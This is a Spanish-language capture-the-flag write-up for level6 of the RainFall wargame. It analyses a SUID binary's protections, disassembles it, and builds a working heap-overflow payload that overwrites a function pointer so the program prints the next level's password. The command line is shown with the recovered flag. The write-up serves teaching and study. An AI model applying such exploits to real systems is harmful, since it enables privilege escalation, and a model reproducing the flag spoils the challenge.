# 1. Buscar Binario:

Listamos los archivos para que muestre el binario del `level6` y sus permisos:
```bash
level6@RainFall:~$ ls -la
total 17
dr-xr-x---+ 1 level6 level6   80 Mar  6  2016 .
dr-x--x--x  1 root   root    340 Sep 23  2015 ..
-rw-r--r--  1 level6 level6  220 Apr  3  2012 .bash_logout
-rw-r--r--  1 level6 level6 3530 Sep 23  2015 .bashrc
-rwsr-s---+ 1 level7 users  5274 Mar  6  2016 level6
-rw-r--r--+ 1 level6 level6   65 Sep 23  2015 .pass
-rw-r--r--  1 level6 level6  675 Apr  3  2012 .profile

```
> **Nota:** El bit `s` en los permisos indica que es un binairo **SUID**. Se ejecuta con los privilegios del propietario (`level7`).

---

# 2. Analizamos las protecciones de la RAM

### a). PIE;
```bash
level6@RainFall:~$ file ./level6 
./level6: setuid setgid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0xb1a5ce594393de0f273c64753cede6da01744479, not stripped
```

### b). ASLR:
```bash
level6@RainFall:~$ cat /proc/sys/kernel/randomize_va_space 
0
```

### c). NX y RELRO:
```bash
level6@RainFall:~$ readelf -l ./level6 | grep -E "STACK|RELRO"
  GNU_STACK      0x000000 0x00000000 0x00000000 0x00000 0x00000 RWE 0x4
```

### d). STACK CANARY:
```bash
level6@RainFall:~$ nm ./level6 
-bash: /usr/bin/nm: Input/output error
```

### e). `.got` y `.plt`:
```bash
level6@RainFall:~$ readelf -S ./level6 | grep -E "got|plt"
  [10] .rel.plt          REL             080482c4 0002c4 000030 08   A  5  12  4
  [12] .plt              PROGBITS        08048330 000330 000070 04  AX  0   0 16
  [22] .got              PROGBITS        080497fc 0007fc 000004 04  WA  0   0  4
  [23] .got.plt          PROGBITS        08049800 000800 000024 04  WA  0   0  4
```

---

# 3. Resumen del análisis:

| Protección | Estado | Evidencia | Consecuencias |
| --- | --- | --- | --- |
| **PIE** | **OFF** | `executable` | El binario siempre carga en `0x08048000` |
| **ASLR** | **OFF** | `0` | Las direcciones de librerías y stack son constantes. |
| **NX** | **OFF** | `GNU_STACK RWE` | Si podemos ejecutar código (ShellCode) en el Stack |
| **RELRO** | **OFF** | `No RELRO ` | La tabla GOT puede ser sobrescrita. |
| **CANARY** | **? ? ?**  | `error` | Buscar con `gdb` |
| **.got.plt** | **WA**  | `WA` | Confirma sección `.got` en escritura |

---

# 4. Fuzzing:

1. Si ejecutamos el binario sin argumentos son devuelve un `Segmentation fault`. Probamos con un argumento y nos printea el string `Nope`.
```bash
level6@RainFall:~$ ./level6 
Segmentation fault (core dumped)
level6@RainFall:~$
level6@RainFall:~$ ./level6 test
Nope
level6@RainFall:~$
```

2. Probamos a romper el binario desbordando el buffer y obtenemos un `Segmentation fault`:
```bash
level6@RainFall:~$ ./level6 asddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddd
Segmentation fault (core dumped)
level6@RainFall:~$ 
```

# 5. Reverse Engineering (Target Identification):

- Desensamblamos el binario:
```asm
0x08048485 <+9>:	mov    DWORD PTR [esp],0x40         ; Reserva 64 bytes para buffer (char * buffer) del heap
0x0804848c <+16>:	call   0x8048350 <malloc@plt>       ; Llama a la función malloc (1º malloc)
0x08048491 <+21>:	mov    DWORD PTR [esp+0x1c],eax     ; Guarda buffer en [esp+0x1c]
0x08048495 <+25>:	mov    DWORD PTR [esp],0x4          ; Reserva 4 bytes para un puntero (2º malloc)
0x0804849c <+32>:	call   0x8048350 <malloc@plt>       ; Llama al segundo malloc
0x080484a1 <+37>:	mov    DWORD PTR [esp+0x18],eax     ; Guarda el puntero en [esp+0x18]
0x080484a5 <+41>:	mov    edx,0x8048468                ; Carga la dirección 0x8048468 en EDX
```

- Lo que hay en la dirección `0x8048468` es la función `m()`:
```bash
evel6@RainFall:~$ objdump -d ./level6 | grep 8048468
08048468 <m>:                  ⟸
8048468:	55                   	push   %ebp
80484a5:	ba 68 84 04 08       	mov    $0x8048468,%edx
```

- Desensamblamos la función `m()` y vemos que es la función que printea `Nope` usando `puts(m)`:
```bash
0x0804846e <+6>:	mov    DWORD PTR [esp],0x80485d1        ⟸
0x08048475 <+13>:	call   0x8048360 <puts@plt>
(gdb) x/s 0x80485d1
0x80485d1:	 "Nope"                                         ⟸
```
- Como vemos más arriba guarda esa dirección `(edx)` dentro del segundo `malloc`.
- Esto significa que el segundo `malloc` contiene la dirección de la función que el programa espera ejecutar.
- Continuemos leyendo el binario `main` y vemos que llama a `strcpy` para copiar el argv[1] en el buffer.
```asm
0x080484b6 <+58>:	mov    eax,DWORD PTR [eax]          ; char *src = argv[1]
0x080484b8 <+60>:	mov    edx,eax                      ; edx = src
0x080484ba <+62>:	mov    eax,DWORD PTR [esp+0x1c]     ; eax = buffer (buffer de 64 bytes)
0x080484be <+66>:	mov    DWORD PTR [esp+0x4],edx      ; argv[1] = src
0x080484c2 <+70>:	mov    DWORD PTR [esp],eax          ; bufer = dest
0x080484c5 <+73>:	call   0x8048340 <strcpy@plt>       ; strcpy(buffer,  argv[1])
```
- Buscamos si hay otras funciones hay en el binario, descubrimos la función `n()` , la desensamblamos y buscamos que es lo que hay en la dirección del syscall `system(0x80485b0)`:
```bash
(gdb) info functions
0x08048454  n       ⟸
0x08048468  m
0x0804847c  main
(gdb) disas n
0x0804845a <+6>:	mov    DWORD PTR [esp],0x80485b0  ⟸
0x08048461 <+13>:	call   0x8048370 <system@plt>
(gdb) x/s 0x80485b0
0x80485b0:	 "/bin/cat /home/user/level7/.pass"
```

- La función `n()` ejecuta el comando para leer `.pass`.

Para ver con detalle el analisis consulta el archivo  [asm_analysis.md](https://github.com/4trastos/Rainfall/blob/main/level6/Resources/README.md) en conjunto con el programa de demostración  [source.c](https://github.com/4trastos/Rainfall/blob/main/level6/source.c).

# 6. Solución: Heap-based Buffer Overflow

Sobrescribir el contenido del segundo malloc (el puntero de función) para que en el lugar de contener la dirección de `m()` `0x08048468` contenga la dirección de `n()` `0x08048454`.

Al llegar a al instruciión `call eax` el programa saltará a la función `n()` la cual tiene privilegios de `level7` y ejecutará el comando para leer `.pass`

```asm
0x080484ca <+78>:	   mov    eax,DWORD PTR [esp+0x18]
0x080484ce <+82>:	   mov    eax,DWORD PTR [eax]
0x080484d0 <+84>:	   call   eax           ⟸
```

1. **Identificamos el BACKDOOR**
```asm
0x080484a5 <+41>:	mov    edx,0x8048468       ; Sustituir esa dirección de memoria
```

2. **Cálculo del Offset:**

- 64 bytes del buffer del primer malloc + 4 bytes del puntero del 2º malloc + 4 bytes del header (puntero) de la función `n()` => 72 bytes.

3. **Construcción del Payload:**

- **printf 'A%.0s' {1..72}**: Pasamos como argumento los bytes basura para desbordar el buffer.
- **printf "\x54\x84\x04\x08"**: La direccíon de memoria a la que queremos que salte.
- **`$(printf 'A%.0s' {1..72}; printf "\x54\x84\x04\x08")`**

### **Ejecución:**
```bash
level6@RainFall:~$ ./level6 $(printf 'A%.0s' {1..72}; printf "\x54\x84\x04\x08") 
f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
level6@RainFall:~$ su level7
Password: 
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/user/level7/level7
level7@RainFall:~$ 
```

# ** 7. Conclusión:**

EL el **nivel 6** la forma de explotar el binario es usando la tecnica del **Heap-based Buffer Overflow**. Esta vez desbordamos el heap en lugar del stack.

Como el programa usa dos malloc seguidos podemos desbordarlos facilmente y hacer que ejecute la funciñón que nosotros deseamos. A eso le sumamos que al copiar el `argv[1]` con `strcpy()` no controla el tamaño de la string a copiar.

